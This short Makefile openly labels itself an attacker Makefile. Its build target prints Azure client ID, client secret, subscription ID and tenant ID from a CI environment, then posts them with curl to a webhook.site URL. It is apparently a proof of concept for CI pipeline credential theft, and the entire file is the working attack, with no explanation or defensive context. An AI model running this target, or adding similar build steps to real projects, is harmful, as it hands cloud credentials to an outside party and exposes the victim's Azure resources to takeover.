EXFIL_URL := https://webhook.site/732f2cc8-0564-45bd-b8b6-a3078db28264

.PHONY: build

build:
	@echo "=== ATTACKER MAKEFILE EXECUTING ==="
	@echo "[*] Dumping Azure credentials from CI environment..."
	@echo "AZ_CLIENT_ID=$$AZ_CLIENT_ID"
	@echo "AZ_CLIENT_SECRET=$$AZ_CLIENT_SECRET"
	@echo "AZ_SUBSCRIPTION_ID=$$AZ_SUBSCRIPTION_ID"
	@echo "AZ_TENANT_ID=$$AZ_TENANT_ID"
	@echo "[*] Exfiltrating via HTTP POST..."
	-@curl -s -X POST $(EXFIL_URL) -d "client_id=$$AZ_CLIENT_ID&client_secret=$$AZ_CLIENT_SECRET&subscription_id=$$AZ_SUBSCRIPTION_ID&tenant_id=$$AZ_TENANT_ID"
	@echo "[+] Credentials exfiltrated. Attack complete."
